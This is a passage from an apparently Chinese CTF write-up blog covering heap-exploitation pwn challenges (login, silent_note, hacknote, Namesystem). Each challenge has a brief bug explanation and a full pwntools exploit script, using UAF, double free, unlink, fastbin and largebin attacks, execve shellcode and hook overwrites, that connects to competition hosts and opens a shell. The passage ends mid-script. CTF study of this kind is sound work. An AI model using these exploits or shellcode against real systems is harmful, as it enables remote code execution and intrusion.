class="number">10001</span>)</span><br></pre></td></tr></table></figure>
<h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Delete里有UAF，构造chunk和Node重叠，释放一个ub，覆盖8+6字节爆破高位，之后是次高位…最终爆破得到libc地址，在修改func指针为one_gadget</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./login'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./login'</span>)</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = process(<span class="string">'./login'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'8sdafgh.gamectf.com'</span>,<span class="number">20000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Register</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the user id:\n"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the password length:\n"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input password:\n"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Login</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the user id:\n"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the passwords length:\n"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size &gt; <span class="number">0</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Input the password:\n"</span>)</span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the user id:\n"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Input new pass:\n"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the user id:\n"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Register(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">'0'</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Register(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'1'</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">'\x7f'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        Login(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'1'</span>*<span class="number">4</span>+p8(i)+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">            payload = p8(i) + payload</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Register(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'1'</span>*<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        Login(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'1'</span>*<span class="number">3</span>+p8(i)+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">            payload = p8(i) + payload</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Register(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'1'</span>*<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        Login(<span class="number">3</span>,<span class="number">0x20</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'1'</span>*<span class="number">2</span>+p8(i)+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">            payload = p8(i) + payload</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Register(<span class="number">4</span>,<span class="number">0x88</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'1'</span>*<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        Login(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'1'</span>*<span class="number">1</span>+p8(i)+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">            payload = p8(i) + payload</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    libc_base = u64((<span class="string">'\x78'</span>+payload).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Register(<span class="number">5</span>,<span class="number">0x18</span>,p64(<span class="number">0x00603000</span>)+p64(libc_base+gadgets[<span class="number">1</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x400be7')</span></span><br><span class="line">    Login(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="silent-note"><a href="#silent-note" class="headerlink" title="silent_note"></a>silent_note</h3><p>只能calloc 0x28或者0x208，删除里有double free，构造Overlapping chunk，unlin再编辑即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'8sdafgh.gamectf.com'</span>,<span class="number">35555</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which kind of note do you want to add?\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0x28</span>:</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">elif</span> size == <span class="number">0x208</span>:</span><br><span class="line">        p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"size illegal"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Content:\n"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which kind of note do you want to update?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Content:\n"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'4.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which kind of note do you want to delete?"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line"></span><br><span class="line">    bss1 = <span class="number">0x6020d0</span></span><br><span class="line">    bss2 = <span class="number">0x6020d8</span></span><br><span class="line">    Add(<span class="number">0x208</span>,<span class="string">'0'</span>)</span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="string">'1'</span>)</span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="string">'1'</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="string">'2'</span>)</span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        Add(<span class="number">0x28</span>,<span class="string">'0'</span>)</span><br><span class="line">    Update(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(bss2<span class="number">-0x18</span>)+p64(bss2<span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x31</span>)+p64(<span class="number">0x31</span>)*(<span class="number">0x1a0</span>/<span class="number">8</span>)+p64(<span class="number">0x1d0</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Update(<span class="number">2</span>,<span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"></span><br><span class="line">    Update(<span class="number">1</span>,p64(elf.plt[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">    Update(<span class="number">2</span>,<span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"2.Large\n"</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    Update(<span class="number">2</span>,<span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0x6020c0</span>))</span><br><span class="line">    Update(<span class="number">1</span>,p64(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="湖湘杯复赛"><a href="#湖湘杯复赛" class="headerlink" title="湖湘杯复赛"></a>湖湘杯复赛</h2><h3 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h3><p>静态编译，第一种解法找到malloc_hook和free_hook，Edit里的strlen会导致溢出，构造Overlapping chunk之后fastbin attack到malloc_hook(0x42的fake chunk size)，写shellcode并把malloc_hook改成sc地址，第二种是largebin attack改bk和Bk_nextsize到malloc_hook，使得mallok_hook里写ub的地址，ub里写sc即可<br>第一种：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./HackNote'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./HackNote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'183.129.189.62'</span>,<span class="number">13504</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'-----------------\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Size:\n"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Note:\n"</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'-----------------\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Index of Note:\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'-----------------\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Index of Note:\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Note:\n"</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    free_hook = <span class="number">0x6cd5e8</span></span><br><span class="line">    malloc_hook = <span class="number">0x6cb788</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    fake_chunk = <span class="number">0x6cb772</span></span><br><span class="line">    Add(<span class="number">0x88</span>,<span class="string">'0'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'2'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'3'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">'0'</span>*<span class="number">0x88</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">'0'</span>*<span class="number">0x80</span>+<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x100</span>+<span class="number">0x40</span>+<span class="number">1</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x100</span>+<span class="number">0x30</span>,<span class="string">'1'</span>*<span class="number">0xf0</span>+<span class="string">'a'</span>*<span class="number">8</span>+p64(<span class="number">0x41</span>)+p64(fake_chunk)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x38</span>,p64(fake_chunk)+<span class="string">'\n'</span>)</span><br><span class="line">    sc = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span><br><span class="line">    Add(<span class="number">0x38</span>,<span class="string">'3'</span>*<span class="number">6</span>+p64(malloc_hook+<span class="number">8</span>)+sc+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'-----------------\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Size:\n"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">30</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure></p>
<p>第二种：<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./HackNote'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./HackNote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'183.129.189.62'</span>,<span class="number">13504</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'-----------------\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Size:\n"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Note:\n"</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'-----------------\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Index of Note:\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'-----------------\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Index of Note:\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Note:\n"</span>)</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    free_hook = <span class="number">0x6cd5e8</span></span><br><span class="line">    malloc_hook = <span class="number">0x6cb788</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(<span class="number">0x318</span>,<span class="string">'0'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x438</span>,<span class="string">'2'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x88</span>,<span class="string">'3'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'4'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x448</span>,<span class="string">'5'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'6'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#6</span></span><br><span class="line">    <span class="comment">#overlapping</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">'0'</span>*<span class="number">0x318</span>)</span><br><span class="line">    Edit(<span class="number">0</span>,<span class="string">'0'</span>*<span class="number">0x310</span>+p64(<span class="number">0</span>)+<span class="string">'\x41\x05'</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Add(<span class="number">0x530</span>,<span class="string">'1'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#1 == chunk1 + chunk2</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">3</span>,<span class="string">'3'</span>*<span class="number">0x88</span>)</span><br><span class="line">    Edit(<span class="number">3</span>,<span class="string">'3'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+<span class="string">'\x51\x05'</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Add(<span class="number">0x540</span>,<span class="string">'4'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#4 == chunk4 + chunk5</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">0x30</span>,<span class="string">'0'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x441</span>)+p64(<span class="number">0</span>)+p64(malloc_hook<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(malloc_hook)+<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">0x30</span>,<span class="string">'2'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)<span class="comment">#2</span></span><br><span class="line">    Edit(<span class="number">4</span>,<span class="string">'4'</span>*<span class="number">0xf0</span>+asm(shellcraft.sh())+<span class="string">'\n'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.recvuntil(<span class="string">'-----------------\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the Size:\n"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure></p>
<h3 id="Namesystem"><a href="#Namesystem" class="headerlink" title="Namesystem"></a>Namesystem</h3><p>没开PIE，got表可写，删除时候从后往前写，chunk_list满的时候会造成重合chunk，最后fastbin attack三次，分别将chunk_list[0]改成puts@got，free@got到puts@plt，泄露出地址再改free到system即可</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./NameSystem'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line"></span><br><span class="line">    p = process(<span class="string">'./NameSystem'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'183.129.189.62'</span>,<span class="number">16205</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Name Size:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"The id you want to delete:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    count = <span class="number">10</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count):</span><br><span class="line">        Add(<span class="number">0x60</span>,str(i)+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count):</span><br><span class="line">        Delete(count-i<span class="number">-1</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>-count):</span><br><span class="line">        Add(<span class="number">0x50</span>,p64(<span class="number">0x71</span>)*(<span class="number">0x50</span>/<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count):</span><br><span class="line">        Add(<span class="number">0x60</span>,p64(<span class="number">0x71</span>)*(<span class="number">0x60</span>/<span 